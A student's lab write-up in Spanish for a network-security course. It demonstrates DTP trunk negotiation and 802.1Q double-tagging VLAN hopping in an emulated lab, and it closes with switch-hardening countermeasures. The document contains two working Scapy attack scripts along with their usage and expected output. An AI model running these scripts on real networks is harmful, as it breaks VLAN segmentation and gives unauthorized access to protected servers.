[README_DTP_VLAN_Hopping.md](https://github.com/user-attachments/files/28906953/README_DTP_VLAN_Hopping.md)
# 🟠 Lab — DTP VLAN Hopping
### ITLA | Seguridad de Redes | Matrícula: 2025-0730 | Arlene | Junio 2026

> ⚠️ **ADVERTENCIA:** Este repositorio es de uso exclusivamente académico en entornos de laboratorio controlados (GNS3 / PNET Lab). La ejecución de estos ataques en redes de producción es **ilegal y antiética.**

---

## 📋 Objetivo del Laboratorio

Demostrar cómo **DTP (Dynamic Trunking Protocol)** puede ser explotado para negociar un enlace troncal desde un puerto de acceso, permitiendo al atacante:

- **(Fase 1)** Forzar al switch SW-2 a elevar el puerto e0/2 (acceso VLAN 10) a **modo troncal** mediante tramas DTP falsas.
- **(Fase 2)** Usar **Double-Tagging 802.1Q** para saltar de VLAN 10 (Usuarios) a VLAN 20 (Servidores) y acceder al servidor Linux sin autorización.

---

## 🗂️ Contenido del Repositorio

```
lab-dtp-vlan-hopping-itla-2025-0730/
├── README.md              ← Este archivo
├── dtp_attack.py          ← Script de negociación DTP con Scapy
├── vlan_hopping.py        ← Script de Double-Tagging VLAN Hopping
├── capturas/              ← Screenshots del laboratorio
└── video_link.md          ← Enlace al video de YouTube
```

---

## 🌐 Documentación de la Red

### Topología

```
R1 → SW-1 → SW-2 → {Cliente, Atacante, Linux}

R1   e0/0  ──── SW-1  e0/0   (troncal 802.1Q)
SW-1 e0/1  ──── SW-2  e0/0   (troncal 802.1Q)
SW-2 e0/1  ──── Cliente eth1  (acceso VLAN 10)
SW-2 e0/2  ──── Atacante e0   (acceso VLAN 10) ← PUERTO OBJETIVO
SW-2 e0/3  ──── Linux e0      (acceso VLAN 20) ← VLAN DESTINO
```

### Tabla de Direccionamiento IP

| Dispositivo | Interfaz | Dirección IP | Máscara | VLAN |
|---|---|---|---|---|
| R1 | e0/0.10 | 192.168.30.1 | 255.255.255.0 | 10 |
| R1 | e0/0.20 | 192.168.7.1 | 255.255.255.0 | 20 |
| R1 | e0/0.99 | 192.168.99.1 | 255.255.255.0 | 99 |
| SW-1 | VLAN 99 | 192.168.99.2 | 255.255.255.0 | 99 |
| SW-2 | VLAN 99 | 192.168.99.3 | 255.255.255.0 | 99 |
| Cliente | eth1 | 192.168.30.15 | 255.255.255.0 | 10 |
| **Atacante** | e0 | **192.168.30.50** | 255.255.255.0 | 10 |
| **Linux (Víctima)** | e0 | **192.168.7.10** | 255.255.255.0 | 20 |

### VLANs Definidas

| VLAN ID | Nombre | Subred |
|---|---|---|
| 10 | USUARIOS | 192.168.30.0/24 |
| 20 | SERVIDORES | 192.168.7.0/24 |
| 99 | GESTION (nativa) | 192.168.99.0/24 |

---

## ⚙️ Parámetros del Ataque

| Parámetro | Valor | Descripción |
|---|---|---|
| Interfaz atacante | `eth0` | Interfaz del atacante (SW-2 e0/2) |
| VLAN origen | `10` | VLAN actual del atacante |
| VLAN destino | `20` | VLAN víctima (servidores) |
| VLAN nativa | `99` | VLAN nativa del troncal (usada en Double-Tagging) |
| IP atacante | `192.168.30.50` | IP del atacante en VLAN 10 |
| IP víctima | `192.168.7.10` | Servidor Linux en VLAN 20 |
| Herramienta | `Scapy (Python 3)` | Scripts de negociación DTP y doble etiquetado |

---

## 🛠️ Requisitos de Instalación

```bash
# Sistema operativo: Kali Linux (en GNS3/PNET Lab)

# Instalar Scapy
sudo pip3 install scapy

# Instalar Yersinia (alternativa para DTP)
sudo apt install yersinia -y

# Verificar
python3 -c "from scapy.all import *; print('Scapy OK')"
```

---

## 📄 Scripts

### Script 2A — `dtp_attack.py`

Envía tramas DTP con flag `desirable` para convencer al switch SW-2 de negociar un enlace troncal en el puerto e0/2 (actualmente en modo acceso).

```python
#!/usr/bin/env python3
# dtp_attack.py — Fuerza negociación de troncal DTP
# Matrícula: 2025-0730 | ITLA
# Requisito: pip install scapy
# Ejecución: sudo python3 dtp_attack.py -i eth0

from scapy.all import *
import argparse, time

def build_dtp_desirable(iface):
    src_mac = get_if_hwaddr(iface)
    dst_mac = '01:00:0c:cc:cc:cc'
    dtp_payload = bytes([
        0x00, 0x01,              # version
        0x00, 0x01, 0x00, 0x04, # TLV type=1 (domain), len=4
        0x00, 0x00, 0x00, 0x00, # domain (empty)
        0x00, 0x02, 0x00, 0x05, # TLV type=2 (status), len=5
        0xa5,                    # desirable non-ISL
        0x00, 0x03, 0x00, 0x05, # TLV type=3 (DTP type), len=5
        0xa5,                    # desirable
        0x00, 0x04, 0x00, 0x08, # TLV type=4 (neighbor), len=8
    ]) + bytes.fromhex(src_mac.replace(':', ''))
    pkt = Ether(src=src_mac, dst=dst_mac) / \
          LLC(dsap=0xAA, ssap=0xAA, ctrl=3) / \
          SNAP(OUI=0x00000C, code=0x2004) / \
          Raw(dtp_payload)
    return pkt

def main():
    ap = argparse.ArgumentParser(description='DTP Attack - ITLA 2025-0730')
    ap.add_argument('-i', '--iface', default='eth0')
    ap.add_argument('-c', '--count', type=int, default=10)
    args = ap.parse_args()
    print(f'[*] Enviando tramas DTP desirable en {args.iface}...')
    pkt = build_dtp_desirable(args.iface)
    for i in range(args.count):
        sendp(pkt, iface=args.iface, verbose=False)
        print(f'[+] Trama DTP enviada #{i+1}')
        time.sleep(1)
    print('[*] Si el puerto era dynamic-auto, ahora debería ser troncal.')
    print('[*] Verificar con: show interfaces trunk (en el switch)')

if __name__ == '__main__':
    main()
```

**Uso:**
```bash
sudo python3 dtp_attack.py -i eth0 -c 10
```

**Salida esperada:**
```
[*] Enviando tramas DTP desirable en eth0...
[+] Trama DTP enviada #1
[+] Trama DTP enviada #2
...
[*] Si el puerto era dynamic-auto, ahora debería ser troncal.
```

**Verificar en SW-2:**
```
SW-2# show interfaces trunk
Port      Mode         Encapsulation  Status
Et0/2     auto         802.1q         trunking   ← ¡ÉXITO!
```

---

### Script 2B — `vlan_hopping.py`

Con el troncal activo, envía paquetes con doble etiqueta 802.1Q para alcanzar VLAN 20 desde VLAN 10.

```python
#!/usr/bin/env python3
# vlan_hopping.py — Double-Tagging VLAN Hopping
# Matrícula: 2025-0730 | ITLA
# Accede a VLAN 20 (Servidores) desde VLAN 10 (Usuarios)
# Requisito: pip install scapy
# Ejecución: sudo python3 vlan_hopping.py -i eth0 --dst-ip 192.168.7.10

from scapy.all import *
import argparse

def vlan_hop(iface, src_ip, dst_ip, outer_vlan, inner_vlan, count=5):
    src_mac = get_if_hwaddr(iface)
    print(f'[*] VLAN Hopping: VLAN{outer_vlan} -> VLAN{inner_vlan}')
    print(f'[*] Destino: {dst_ip}')

    # Double-tagged frame: outer=VLAN nativa (99), inner=VLAN destino (20)
    pkt = Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') / \
          Dot1Q(vlan=outer_vlan) / \
          Dot1Q(vlan=inner_vlan) / \
          IP(src=src_ip, dst=dst_ip) / \
          ICMP()

    for i in range(count):
        sendp(pkt, iface=iface, verbose=False)
        print(f'[+] Paquete hopping #{i+1} enviado -> {dst_ip}')

def main():
    ap = argparse.ArgumentParser(description='VLAN Hopping - ITLA 2025-0730')
    ap.add_argument('-i', '--iface', default='eth0')
    ap.add_argument('--src-ip', default='192.168.30.50')
    ap.add_argument('--dst-ip', default='192.168.7.10')
    ap.add_argument('--outer-vlan', type=int, default=99)
    ap.add_argument('--inner-vlan', type=int, default=20)
    ap.add_argument('--count', type=int, default=5)
    args = ap.parse_args()
    vlan_hop(args.iface, args.src_ip, args.dst_ip,
             args.outer_vlan, args.inner_vlan, args.count)

if __name__ == '__main__':
    main()
```

**Uso:**
```bash
sudo python3 vlan_hopping.py -i eth0 --src-ip 192.168.30.50 --dst-ip 192.168.7.10 --outer-vlan 99 --inner-vlan 20
```

**Salida esperada:**
```
[*] VLAN Hopping: VLAN99 -> VLAN20
[*] Destino: 192.168.7.10
[+] Paquete hopping #1 enviado -> 192.168.7.10
[+] Paquete hopping #2 enviado -> 192.168.7.10
...
```

---

## 🔬 Documentación del Funcionamiento

```
┌──────────────────────────────────────────────────────────────────────┐
│               CÓMO FUNCIONA EL ATAQUE DTP VLAN HOPPING              │
├──────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  FASE 1 — Negociación DTP                                             │
│  ─────────────────────────────────────────────────────────────────── │
│  Atacante (VLAN 10)  →  tramas DTP "desirable"  →  SW-2 e0/2        │
│                                                                        │
│  SW-2 e0/2 estaba en modo "dynamic auto".                            │
│  Al recibir tramas "desirable", negocia y pasa a modo TRUNK.         │
│  El atacante ahora puede etiquetar tráfico con cualquier VLAN ID.    │
│                                                                        │
│  FASE 2 — Double-Tagging 802.1Q                                      │
│  ─────────────────────────────────────────────────────────────────── │
│  Paquete enviado con dos etiquetas:                                   │
│    Etiqueta exterior: VLAN 99 (nativa del troncal)                   │
│    Etiqueta interior: VLAN 20 (servidores — destino real)            │
│                                                                        │
│  SW-2 elimina la etiqueta exterior (VLAN 99) y reenvía.              │
│  SW-1 ve la etiqueta interior (VLAN 20) y entrega al servidor Linux. │
│                                                                        │
│  Resultado: el atacante alcanza VLAN 20 sin tener acceso legítimo.   │
└──────────────────────────────────────────────────────────────────────┘
```

**Flujo del paquete:**
```
Atacante → [VLAN99][VLAN20] IP dst:192.168.7.10
SW-2: quita VLAN99 (nativa) → reenvía [VLAN20] IP dst:192.168.7.10
SW-1: entrega a VLAN20 → Linux recibe el paquete
```

---

## 🛡️ Contramedidas y Mitigación

### 1. Deshabilitar DTP en todos los puertos de acceso

```
interface ethernet0/2
 switchport mode access
 switchport nonegotiate        ← Deshabilita DTP
 switchport access vlan 10
 spanning-tree portfast
 spanning-tree bpduguard enable
```

`switchport nonegotiate` evita que el puerto responda o envíe tramas DTP, haciendo imposible la negociación del troncal.

### 2. Cambiar la VLAN nativa a una VLAN no utilizada

```
interface ethernet0/0
 switchport trunk native vlan 999

vlan 999
 name VLAN_NATIVA_UNUSED
```

Sin una VLAN nativa conocida, el Double-Tagging pierde su vector de ataque.

### 3. BPDU Guard en puertos de acceso

```
interface ethernet0/2
 spanning-tree portfast
 spanning-tree bpduguard enable
```

### Verificación

```
show interfaces trunk
show interfaces status
```

Confirmar que e0/2 aparezca como `access` y no como `trunking`.

---

## 🎥 Video de Demostración

📺 Ver el video en: [video_link.md](./video_link.md)

**Lista de reproducción:** `Laboratorio Seguridad de Redes - ITLA 2025-0730 - Arlene`

---

## 👩‍💻 Autora

| Campo | Valor |
|---|---|
| Nombre | Arlene |
| Matrícula | 2025-0730 |
| Asignatura | Seguridad de la Información / Ciberseguridad |
| Instructor | Delis Martínez |
| Institución | ITLA — Instituto Tecnológico de las Américas |
| Fecha | Junio 2026 |

---

*ITLA | Seguridad de Redes | Matrícula: 2025-0730 | Arlene | Junio 2026*
